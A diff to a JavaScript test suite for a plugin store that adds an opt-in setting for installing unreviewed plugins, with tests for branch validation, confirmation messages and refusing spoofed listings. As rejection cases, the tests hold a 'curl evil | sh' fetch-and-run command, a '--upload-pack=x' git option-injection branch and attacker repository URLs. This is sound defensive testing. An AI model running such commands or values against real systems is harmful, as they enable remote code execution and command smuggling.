@@ -23,7 +23,9 @@ const Model = new Function(
     catalogCategories, catalogKindKey, catalogKindOptions, catalogAvailabilityOptions, catalogSortOptions,
     filterCatalog, sortCatalog, matchesCatalogQuery, catalogIsFiltering,
     clearedCatalogFilters, catalogEmptyMessage,
-    installState, installBlockedReason, starLabel, accentColor, installedTint, catalogDetailFields, catalogMetaLine,
+    installState, installBlockedReason, installStateDiffers, catalogUnverifiedSnapshot,
+    installUnverifiedConfirmMessage, allowUnverifiedInstalls,
+    starLabel, accentColor, installedTint, catalogDetailFields, catalogMetaLine,
     repoShortLabel, browsableUrl, repoWebUrl, rowRepoUrl, expandedTabFromPayload, expandedScreenFromPayload,
     normalizedManifestVersion, normalizedReleaseVersion, releaseVersionLabel,
     githubReleaseCandidates, versionReleaseCandidates, versionFallbackUrl,
@@ -1425,6 +1427,132 @@ test("the registry's generic note never hides why this panel refuses an install"
     "This plugin requires additional setup before it can be enabled.")
 })
 
+// One unreviewed listing that names the branch the marketplace validated, so
+// the install opt-in has something to offer. Kept beside the tests that use it.
+const unreviewedListing = {
+  id: "acme.fresh", name: "Fresh", kind: "Panel", category: "Tools",
+  repo: "https://github.com/acme/fresh",
+  installCommand: "omarchy plugin add https://github.com/acme/fresh.git --enable",
+  installAvailable: true, sourceType: "community", verificationStatus: "unverified",
+  listingValidatedBranch: "main"
+}
+
+test("an unreviewed listing is installable only under the install opt-in", () => {
+  // The same shape as the update opt-in: off by default, a verified snapshot
+  // always wins, and the setting is a separate key from the update one.
+  const off = Model.catalogEntries({ plugins: [unreviewedListing] }, {})[0]
+  assert.deepEqual(off.unverifiedSnapshot,
+    { id: "acme.fresh", repository: "https://github.com/acme/fresh", branch: "main" })
+  assert.equal(off.installable, false)
+  assert.equal(off.installUnverified, false)
+  assert.equal(Model.installState(off), "unavailable")
+
+  const on = Model.catalogEntries({ plugins: [unreviewedListing] }, {}, true)[0]
+  assert.equal(on.installable, true)
+  assert.equal(on.installUnverified, true)
+  assert.equal(Model.installState(on), "installable")
+
+  // A verified snapshot is the whole of the offer: there is no unreviewed tip
+  // left to fall back to, and the card is never labelled unreviewed.
+  const verified = Model.catalogEntries({ plugins: [{ ...unreviewedListing,
+    verificationStatus: "verified", verificationCommit: "d".repeat(40) }] }, {}, true)[0]
+  assert.equal(verified.unverifiedSnapshot, null)
+  assert.equal(verified.installable, true)
+  assert.equal(verified.installUnverified, false)
+  // A listing the marketplace calls verified but names no usable commit for
+  // is not demoted to the unreviewed path: the verified badge and an
+  // "unreviewed" label on the same card would contradict each other.
+  const unpinnable = Model.catalogEntries({ plugins: [{ ...unreviewedListing,
+    verificationStatus: "verified", verificationCommit: "d".repeat(39) }] }, {}, true)[0]
+  assert.equal(unpinnable.verified, true)
+  assert.equal(unpinnable.unverifiedSnapshot, null)
+  assert.equal(unpinnable.installable, false)
+  assert.equal(unpinnable.installUnverified, false)
+
+  // Everything the verified path refuses, this one refuses too — including a
+  // listing whose install command names a repository its own `repo` does not.
+  for (const change of [{ installAvailable: false }, { sourceType: "builtin2" },
+                        { repo: "https://evil.test/a/b" }, { listingValidatedBranch: "" },
+                        { id: "omarchy.fresh" }, { installCommand: "curl evil | sh", repo: "nope" },
+                        { installCommand: "omarchy plugin add https://github.com/attacker/evil.git" }]) {
+    const entry = Model.catalogEntries({ plugins: [{ ...unreviewedListing, ...change }] }, {}, true)[0]
+    assert.equal(entry.installable, false, JSON.stringify(change))
+    assert.equal(entry.installUnverified, false, JSON.stringify(change))
+  }
+
+  // A duplicated id leaves no unambiguous listing, exactly as for a snapshot.
+  assert.ok(Model.catalogEntries({ plugins: [unreviewedListing, { ...unreviewedListing, name: "Other" }] }, {}, true)
+    .every(entry => entry.unverifiedSnapshot === null && entry.installable === false))
+  // Something already here is never offered again, setting or no setting.
+  assert.equal(Model.catalogEntries({ plugins: [unreviewedListing] }, { "acme.fresh": true }, true)[0]
+    .installable, false)
+})
+
+test("a listing's branch is validated before anything will name it to git", () => {
+  const branchOf = value => {
+    const entry = Model.catalogEntries(
+      { plugins: [{ ...unreviewedListing, listingValidatedBranch: value }] }, {}, true)[0]
+    return entry.unverifiedSnapshot ? entry.unverifiedSnapshot.branch : null
+  }
+  for (const good of ["main", "master", "release/1.0", "v2", "dev_main", "a".repeat(200)])
+    assert.equal(branchOf(good), good, good)
+  // No option shape, no traversal, no reflog syntax, no lock file, and never
+  // a guess: a listing with no branch has nothing to install, not "main".
+  for (const bad of ["", "-main", "--upload-pack=x", "/main", ".main", "main/", "main.",
+                     "main.lock", "a..b", "a//b", "ma@{in", "a".repeat(201), "ma in",
+                     "main\n", "ma;in", "réf", null, 7, undefined])
+    assert.equal(branchOf(bad), null, JSON.stringify(bad))
+})
+
+test("a blocked listing with a validated branch names the setting that would offer it", () => {
+  const off = Model.catalogEntries({ plugins: [unreviewedListing] }, {})[0]
+  assert.equal(Model.installBlockedReason(off),
+    "The marketplace has not verified a snapshot of this listing."
+    + " Settings can allow installing its unreviewed upstream tip.")
+
+  // Only when the setting would actually help. A listing whose install
+  // command names another repository stays refused under either setting, so
+  // pointing at the switch would be an offer nothing can honour.
+  const spoofed = Model.catalogEntries({ plugins: [{ ...unreviewedListing,
+    installCommand: "omarchy plugin add https://github.com/attacker/evil.git" }] }, {})[0]
+  assert.equal(Model.installBlockedReason(spoofed),
+    "The marketplace has not verified a snapshot of this listing.")
+})
+
+test("the install opt-in re-stamps the cards already on screen, without a refetch", () => {
+  const entries = Model.catalogEntries({ plugins: [unreviewedListing] }, {})
+  assert.equal(Model.installStateDiffers(entries, {}, false), false)
+  assert.equal(Model.installStateDiffers(entries, {}, true), true)
+
+  const on = Model.restampCatalogInstallState(entries, {}, entries[0], true)
+  assert.equal(on.changed, true)
+  assert.equal(on.entries[0].installable, true)
+  assert.equal(on.entries[0].installUnverified, true)
+  assert.equal(on.detailsEntry, on.entries[0])
+  assert.equal(entries[0].installable, false, "the original array is left alone")
+
+  const back = Model.restampCatalogInstallState(on.entries, {}, on.detailsEntry, false)
+  assert.equal(back.changed, true)
+  assert.equal(back.entries[0].installable, false)
+  assert.equal(back.entries[0].installUnverified, false)
+  // Nothing moved: the very same array returns, so the grid never resets.
+  assert.equal(Model.restampCatalogInstallState(entries, {}, null, false).changed, false)
+  assert.equal(Model.markInstalled(entries, {}, true)[0].installUnverified, true)
+})
+
+test("the unreviewed install confirmation names the branch, never a commit", () => {
+  assert.equal(
+    Model.installUnverifiedConfirmMessage("Fresh", "https://github.com/acme/fresh", "main", false),
+    "Install Fresh from an unreviewed listing?\n\n"
+    + "https://github.com/acme/fresh\n\n"
+    + "The marketplace has not verified any snapshot of this listing. The current tip of branch "
+    + "main is fetched, validated and installed, pinned to that exact commit — nobody has reviewed "
+    + "what it runs. Plugins run unsandboxed inside omarchy-shell. Only add repositories whose code "
+    + "you are willing to run.")
+  assert.ok(Model.installUnverifiedConfirmMessage("Fresh", "https://github.com/acme/fresh", "main", true)
+    .endsWith(Model.catalogPlacementConfirmationNote(true)))
+})
+
 test("a listing whose install command names another repository is not installable", () => {
   // The card shows a url and the request fetches a repository; if those can
   // disagree, a listing can display an official url and install someone
@@ -1490,6 +1618,30 @@ test("installRequest binds the verified snapshot, never the repository tip", () 
   // A snapshot that does not describe this very entry carries no authority.
   assert.equal(Model.installRequest(
     { ...weather, updateSnapshot: { ...weather.updateSnapshot, id: "acme.other" } }, "left"), null)
+  // The install opt-in never touches a verified listing's request.
+  assert.deepEqual(Model.installRequest(weather, "right", true), Model.installRequest(weather, "right"))
+})
+
+test("installRequest binds the validated branch only while the install opt-in allows it", () => {
+  const entry = Model.catalogEntries({ plugins: [unreviewedListing] }, {}, true)[0]
+  assert.equal(entry.installable, true)
+  // The setting is re-read here, never taken from the entry's stale flag: it
+  // may have been switched off while the question was on screen.
+  assert.equal(Model.installRequest(entry, "right"), null)
+  assert.equal(Model.installRequest(entry, "right", "true"), null)
+  assert.deepEqual(Model.installRequest(entry, "right", true), {
+    schemaVersion: 1, id: "acme.fresh", repository: "https://github.com/acme/fresh",
+    branch: "main", section: "right"
+  })
+  for (const section of ["", "left", "center"])
+    assert.equal(Model.installRequest(entry, section, true).section, section)
+  for (const section of ["Right", "bogus", null, undefined, 0])
+    assert.equal(Model.installRequest(entry, section, true), null, String(section))
+  // The same re-derivation the verified path does, on the same evidence.
+  for (const change of [{ installAvailable: false }, { installUrl: "" }, { installed: true },
+                        { installUrl: "https://github.com/acme/other" }, { unverifiedSnapshot: null },
+                        { unverifiedSnapshot: { ...entry.unverifiedSnapshot, id: "acme.other" } }])
+    assert.equal(Model.installRequest({ ...entry, ...change }, "left", true), null, JSON.stringify(change))
 })
 
 test("an already-installed plugin is not offered again", () => {
@@ -1750,6 +1902,18 @@ test("Browse options are derived from catalog kinds and keep fixed policy labels
     { value: "panel", label: "Panel" }
   ])
   assert.deepEqual(Model.catalogAvailabilityOptions().map(o => o.label), ["All", "Available", "Installed"])
+})
+
+test("details name an unreviewed offer as unreviewed, in both windows", () => {
+  // The button still says Install — it is the same action — but Availability
+  // stops claiming the marketplace stands behind it.
+  for (const name of ["PluginDetails.qml", "CatalogDetailsPane.qml"]) {
+    const source = readFileSync(new URL("../" + name, import.meta.url), "utf8")
+    assert.match(source, /readonly property string stateText: !entry \? ""\s*: entry\.installed \? "Installed"\s*: entry\.installUnverified === true \? "Installable \(unreviewed\)"\s*: entry\.installable \? "Available to install"\s*: "Not installable here"/, name)
+  }
+  assert.equal(Model.catalogDetailFields({ author: "", version: "", kind: "", license: "", repo: "" },
+    "Installable (unreviewed)", false).find(row => row.label === "Availability").value,
+    "Installable (unreviewed)")
 })
 
 test("Browse sort options put Recently added first", () => {
@@ -2896,7 +3060,7 @@ test("the Installed tab has no url field: plugins are added from Browse only", (
   // the panel handing its pending answer to the store's request builder.
   assert.match(panel, /function startAdd\(section\) \{\s*store\.startAdd\(section\)\s*\}/)
   const storeSource = readFileSync(new URL("../PluginStore.qml", import.meta.url), "utf8")
-  assert.match(storeSource, /function startAdd\(section\) \{[\s\S]*?Model\.installRequest\(entry, section\)/)
+  assert.match(storeSource, /function startAdd\(section\) \{[\s\S]*?Model\.installRequest\(entry, section, allowUnverifiedInstalls\)/)
   assert.match(storeSource, /function launchInstall\(request, label\) \{[\s\S]*?pinnedProc\.running = true/)
 })
 
@@ -3432,8 +3596,9 @@ test("Panel keeps open details synchronized with catalog install state", () => {
   // The store re-stamps install state without knowing about any open details;
   // it only publishes a new catalog when something actually changed.
   assert.match(store,
-    /var stampedState = Model\.restampCatalogInstallState\(\s*catalog, Model\.installedIdSet\(rows\), null\)/)
+    /var stampedState = Model\.restampCatalogInstallState\(\s*catalog, Model\.installedIdSet\(rows\), null, allowUnverifiedInstalls\)/)
   assert.match(store, /if \(!stampedState\.changed\) return\s*catalog = stampedState\.entries/)
+  assert.match(store, /onRowsChanged: restampCatalog\(\)/)
   // A fresh fetch is built on the worker thread and published from its reply.
   assert.match(store, /catalog = message\.entries/)
   // Every published catalog — re-stamp or fresh fetch — refreshes the open
@@ -3517,9 +3682,13 @@ test("installing runs the pinned helper on the verified commit, never the host a
   // and the url it shows is the repository the request actually fetches —
   // never the registry's free-text install command.
   assert.match(store, /Model\.shortSha\(pendingVerifiedCommit\)/)
-  assert.match(store, /pendingVerifiedCommit = String\(entry\.updateSnapshot\.verifiedCommit\)/)
-  assert.match(store, /pendingUrl = String\(entry\.updateSnapshot\.repository\)/)
+  assert.match(store, /pendingVerifiedCommit = unreviewed \? "" : String\(snapshot\.verifiedCommit\)/)
+  assert.match(store, /pendingUrl = String\(snapshot\.repository\)/)
   assert.doesNotMatch(store, /pendingUrl = entry\.installUrl/)
+  // The opt-in path names the branch instead, and says so in the status line.
+  assert.match(store, /pendingBranch = unreviewed \? String\(snapshot\.branch\) : ""/)
+  assert.match(store, /"Installing the unreviewed tip of " \+ label\s*\+ "; closing this window does not cancel it"/)
+  assert.match(store, /Model\.installUnverifiedConfirmMessage\(pendingLabel, pendingUrl, pendingBranch, pendingPlacementNeeded\)/)
   // Every status the helper can emit for an install is accepted, and only
   // those; nothing else may be reported as a change on disk.
   for (const status of ["installed", "installed; reload failed", "installed; enable failed",
@@ -3528,7 +3697,70 @@ test("installing runs the pinned helper on the verified commit, never the host a
   assert.match(store, /if \(!pinnedExited \|\| \(busyKind !== "update" && busyKind !== "install"\)\) return/)
   // A re-derived request is what actually runs: the dialog's answer is bound
   // to the snapshot the live catalog still names.
-  assert.match(store, /function startAdd\(section\) \{[\s\S]*?request\.verifiedCommit !== commit[\s\S]*?launchInstall\(request, label\)/)
+  assert.match(store, /function startAdd\(section\) \{[\s\S]*?String\(request\.verifiedCommit \|\| ""\) !== commit[\s\S]*?launchInstall\(request, label\)/)
+  assert.match(store, /String\(request\.branch \|\| ""\) !== branch/)
+})
+
+test("an unreviewed install is confirmed and re-gated on the branch the dialog named", () => {
+  const store = readFileSync(new URL("../PluginStore.qml", import.meta.url), "utf8")
+  const catalog = Model.catalogEntries({ plugins: [unreviewedListing] }, {}, true)
+  const base = () => ({ busy: false, pendingKind: "", pendingId: "", pendingLabel: "", pendingUrl: "",
+    pendingBranch: "", pendingVerifiedCommit: "", pendingSection: "", pendingPlacement: "",
+    pendingPlacementNeeded: false, pendingUnverifiedSha: "", allowUnverifiedInstalls: true,
+    catalog: catalog, launched: [], statuses: [],
+    launchInstall(request, label) { this.launched.push([request, label]) },
+    setStatus(text, error) { this.statuses.push([text, error]) } })
+  const call = (state, name, args) => Function("Model", "state", "args", `with (state) {
+    ${qmlFunction(store, "cancelPending")}
+    ${qmlFunction(store, "askInstall")}
+    ${qmlFunction(store, "startAdd")}
+    return ${name}.apply(null, args) }`)(Model, state, args)
+
+  const asked = base()
+  assert.equal(call(asked, "askInstall", [catalog[0]]), true)
+  assert.equal(asked.pendingKind, "install")
+  assert.equal(asked.pendingUrl, "https://github.com/acme/fresh")
+  assert.equal(asked.pendingBranch, "main")
+  assert.equal(asked.pendingVerifiedCommit, "", "there is no reviewed commit to name")
+
+  // The setting went off while the question was on screen: nothing installs.
+  asked.allowUnverifiedInstalls = false
+  call(asked, "startAdd", [""])
+  assert.deepEqual(asked.launched, [])
+  assert.match(asked.statuses.pop()[0], /^Could not install Fresh: /)
+
+  // The listing named another branch under the open dialog: also nothing.
+  const moved = base()
+  call(moved, "askInstall", [catalog[0]])
+  moved.catalog = Model.catalogEntries(
+    { plugins: [{ ...unreviewedListing, listingValidatedBranch: "attacker" }] }, {}, true)
+  call(moved, "startAdd", [""])
+  assert.deepEqual(moved.launched, [])
+
+  // Unchanged: exactly the branch the dialog named is what the helper is asked for.
+  const ok = base()
+  call(ok, "askInstall", [catalog[0]])
+  call(ok, "startAdd", ["right"])
+  assert.deepEqual(ok.launched, [[{ schemaVersion: 1, id: "acme.fresh",
+    repository: "https://github.com/acme/fresh", branch: "main", section: "right" }, "Fresh"]])
+  assert.equal(ok.pendingKind, "", "the pending state is cleared before anything launches")
+
+  // A verified listing still takes the verified shape through the same path,
+  // and never gains a branch.
+  const verifiedEntries = Model.catalogEntries(catalogDoc, {}, true)
+  const weather = base()
+  weather.catalog = verifiedEntries
+  call(weather, "askInstall", [verifiedEntries.find(entry => entry.id === "acme.weather")])
+  assert.equal(weather.pendingBranch, "")
+  call(weather, "startAdd", [""])
+  assert.deepEqual(weather.launched[0][0], { schemaVersion: 1, id: "acme.weather",
+    repository: "https://github.com/acme/omarchy-weather", verifiedCommit: "d".repeat(40), section: "" })
+
+  // With the opt-in off the question is never even asked.
+  const refused = base()
+  refused.allowUnverifiedInstalls = false
+  assert.equal(call(refused, "askInstall", [catalog[0]]), false)
+  assert.equal(refused.pendingKind, "")
 })
 
 test("the catalog is served by the pinned helper through an owner-checked cache, never a bash script", () => {
@@ -4375,8 +4607,9 @@ test("the store owns the pending confirmation flow for both windows", () => {
   assert.match(store, /if \(row\.id === selfId\) \{/)
   assert.match(store, /"omarchy plugin enable " \+ selfId \+ " right"/)
   for (const name of ["pendingKind", "pendingId", "pendingLabel", "pendingUrl", "pendingPlacement",
-                      "pendingVerifiedCommit"])
+                      "pendingVerifiedCommit", "pendingBranch"])
     assert.match(store, new RegExp(`property string ${name}: ""`), name)
+  assert.match(store, /function cancelPending\(\) \{[\s\S]*?pendingBranch = ""/)
   // Only a marketplace-verified listing is installable at all, so there is no
   // "is it verified" bit left to carry around.
   assert.doesNotMatch(store, /pendingVerified\b/)
@@ -4405,7 +4638,7 @@ test("the store owns the pending confirmation flow for both windows", () => {
   ]) assert.match(store, new RegExp(`function ${fn.replace(/[()]/g, "\\$&")} \\{`), fn)
   // Asking returns whether the request was taken, so a surface can do its
   // own bookkeeping (close details, retire a probe) only for real requests.
-  assert.match(store, /function askInstall\(entry\) \{[\s\S]*?if \(!entry \|\| !entry\.installable \|\| !entry\.updateSnapshot \|\| busy\) return false/)
+  assert.match(store, /function askInstall\(entry\) \{[\s\S]*?if \(!entry \|\| !entry\.installable \|\| busy\) return false[\s\S]*?if \(!snapshot\) return false/)
   assert.match(store, /function askRemove\(row\) \{\s*if \(!row \|\| !row\.removable \|\| busy\) return false/)
   // Enable without a placement question and disable of anything but the
   // surface itself are direct actions, exactly as before.
@@ -4699,6 +4932,17 @@ test("the plugin's own shell.json entry is read strictly and the setting is the 
   assert.equal(Model.allowUnverifiedUpdates(null), false)
   assert.equal(Model.allowUnverifiedUpdates(Object.create({ allowUnverifiedUpdates: true })), false, "own key only")
 
+  // Installing unreviewed code is its own decision, under its own key: the
+  // two settings never read each other's value.
+  assert.equal(Model.allowUnverifiedInstalls({ allowUnverifiedInstalls: true }), true)
+  for (const value of ["true", 1, "yes", null, undefined, {}, []])
+    assert.equal(Model.allowUnverifiedInstalls({ allowUnverifiedInstalls: value }), false, String(value))
+  assert.equal(Model.allowUnverifiedInstalls({}), false)
+  assert.equal(Model.allowUnverifiedInstalls(null), false)
+  assert.equal(Model.allowUnverifiedInstalls(Object.create({ allowUnverifiedInstalls: true })), false, "own key only")
+  assert.equal(Model.allowUnverifiedInstalls({ allowUnverifiedUpdates: true }), false, "separate keys")
+  assert.equal(Model.allowUnverifiedUpdates({ allowUnverifiedInstalls: true }), false, "separate keys")
+
   // The settings section rides ahead of the four fixed ones and is optional.
   const four = "===list===\n[]\n===catalog===\n[]\n===git===\n\n===manifest===\n"
   assert.equal(Model.splitSections(four).settings, "")
@@ -4773,6 +5017,12 @@ test("the expanded window's settings face owns the one switch and reads back thr
   assert.match(pane, /Off: only marketplace-verified snapshots are offered\. /)
   assert.match(pane, /pinned to the exact commit the check observed, after a confirmation\./)
   assert.match(pane, /id: unverifiedSwitch[\s\S]*?checked: store\.allowUnverifiedUpdates[\s\S]*?onToggled: store\.setAllowUnverifiedUpdates\(!store\.allowUnverifiedUpdates\)/)
+  // The second opt-in, its own row and its own key, directly below the first.
+  assert.match(pane, /text: "Allow installing unverified plugins"/)
+  assert.match(pane, /Off: only listings with a marketplace-verified snapshot can be installed\. /)
+  assert.match(pane, /pinned to that exact commit, after a confirmation\./)
+  assert.match(pane, /id: unverifiedInstallSwitch[\s\S]*?checked: store\.allowUnverifiedInstalls[\s\S]*?onToggled: store\.setAllowUnverifiedInstalls\(!store\.allowUnverifiedInstalls\)/)
+  assert.ok(pane.indexOf("id: unverifiedSwitch") < pane.indexOf("id: unverifiedInstallSwitch"))
   // Every Text on the face is plain text.
   const texts = pane.split(/\bText \{/).slice(1)
   assert.ok(texts.length >= 3)
@@ -4791,8 +5041,13 @@ test("the expanded window's settings face owns the one switch and reads back thr
   assert.match(store, /property var shell: null/)
   assert.match(store, /readonly property bool allowUnverifiedUpdates: Model\.allowUnverifiedUpdates\(selfSettings\)/)
   assert.match(store, /onAllowUnverifiedUpdatesChanged: rows = Model\.applyPinnedUpdates\(rows, catalog, allowUnverifiedUpdates\)/)
+  // The install opt-in is the same mechanism under its own key, and flipping
+  // it re-stamps the cards already on screen rather than refetching them.
+  assert.match(store, /readonly property bool allowUnverifiedInstalls: Model\.allowUnverifiedInstalls\(selfSettings\)/)
+  assert.match(store, /onAllowUnverifiedInstallsChanged: restampCatalog\(\)/)
   assert.equal(store.split("Model.applyPinnedUpdates(").length - 1,
-    store.split(", allowUnverifiedUpdates)").length - 1, "every projection carries the setting")
+    (store.match(/Model\.applyPinnedUpdates\([^\n]*, allowUnverifiedUpdates\)/g) || []).length,
+    "every projection carries the setting")
   assert.match(store, /selfEntry = Model\.parseSelfEntry\(sections\.settings\)\s*selfEntryLoaded = selfEntry !== null\s*selfSettings = Model\.parseSelfSettings\(sections\.settings\)/)
   assert.match(store, /loadError = "Could not read the plugin list"[\s\S]{0,200}selfEntryLoaded = false/)
   assert.ok(store.indexOf("printf '===settings===") < store.indexOf("printf '===list==="), "settings lead the load stream")
@@ -4807,7 +5062,7 @@ test("the expanded window's settings face owns the one switch and reads back thr
     selfSettings: { position: "right", allowUnverifiedUpdates: true }, selfId: "acme.plugin",
     shell: { updateEntryInline: (id, settings) => { saves.push([id, settings]); return true } },
     allowUnverifiedUpdates: true, setStatus(text, error) { statuses.push([text, error]) } }
-  const api = Function("Model", "state", `with (state) { ${qmlFunction(store, "setAllowUnverifiedUpdates")}; return setAllowUnverifiedUpdates }`)(Model, state)
+  const api = Function("Model", "state", `with (state) { ${qmlFunction(store, "writeSelfSetting")}; ${qmlFunction(store, "setAllowUnverifiedUpdates")}; return setAllowUnverifiedUpdates }`)(Model, state)
   assert.equal(api(false), true)
   assert.deepEqual(saves, [["acme.plugin", { position: "right", pinned: ["a", "b"], nested: { k: 1 }, big: "y".repeat(300) }]])
   assert.deepEqual(state.selfEntry, saves[0][1])
@@ -4842,6 +5097,17 @@ test("the expanded window's settings face owns the one switch and reads back thr
   assert.equal(api(true), true)
   assert.deepEqual(saves[1], ["acme.plugin", { allowUnverifiedUpdates: true }])
   assert.deepEqual(state.selfSettings, { allowUnverifiedUpdates: true })
+
+  // The install switch is the same write under its own key: both settings can
+  // stand in the entry at once, and neither erases the other.
+  Object.assign(state, { allowUnverifiedUpdates: true, allowUnverifiedInstalls: false })
+  const installApi = Function("Model", "state", `with (state) { ${qmlFunction(store, "writeSelfSetting")}; ${qmlFunction(store, "setAllowUnverifiedInstalls")}; return setAllowUnverifiedInstalls }`)(Model, state)
+  assert.equal(installApi(true), true)
+  assert.deepEqual(saves[2], ["acme.plugin", { allowUnverifiedUpdates: true, allowUnverifiedInstalls: true }])
+  assert.deepEqual(state.selfSettings, { allowUnverifiedUpdates: true, allowUnverifiedInstalls: true })
+  state.allowUnverifiedInstalls = true
+  assert.equal(installApi(true), true, "the value already in force is a no-op")
+  assert.equal(saves.length, 3)
 })
 
 test("the popup's settings pane owns the same switch and writes through the bar's shell", () => {
@@ -4879,12 +5145,18 @@ test("the popup's settings pane owns the same switch and writes through the bar'
   assert.match(pane, /Off: only marketplace-verified snapshots are offered\. /)
   assert.match(pane, /pinned to the exact commit the check observed, after a confirmation\./)
   assert.match(pane, /id: unverifiedSwitch[\s\S]*?checked: store\.allowUnverifiedUpdates[\s\S]*?onToggled: store\.setAllowUnverifiedUpdates\(!store\.allowUnverifiedUpdates\)/)
+  assert.match(pane, /text: "Allow installing unverified plugins"/)
+  assert.match(pane, /id: unverifiedInstallSwitch[\s\S]*?checked: store\.allowUnverifiedInstalls[\s\S]*?onToggled: store\.setAllowUnverifiedInstalls\(!store\.allowUnverifiedInstalls\)/)
+  assert.ok(pane.indexOf("id: unverifiedSwitch") < pane.indexOf("id: unverifiedInstallSwitch"))
   // Every Text on the pane is plain text; the copy is the expanded window's.
   const texts = pane.split(/\bText \{/).slice(1)
   assert.ok(texts.length >= 3)
   for (const text of texts) assert.match(text.slice(0, 200), /textFormat: Text\.PlainText/)
   const caption = /text: "Off: only marketplace-verified snapshots are offered\. "\s*\+ "([^"]+)"/
   assert.equal(pane.match(caption)[1], expanded.match(caption)[1], "same caption in both windows")
+  const installCaption = /text: "Off: only listings with a marketplace-verified snapshot can be installed\. "\s*\+ "([^"]+)"/
+  assert.equal(pane.match(installCaption)[1], expanded.match(installCaption)[1],
+    "same install caption in both windows")
 
   // While the pane is up the key catcher hands keys to it, the list never
   // steals focus back, a tab switch drops it, and closing the popup resets it.
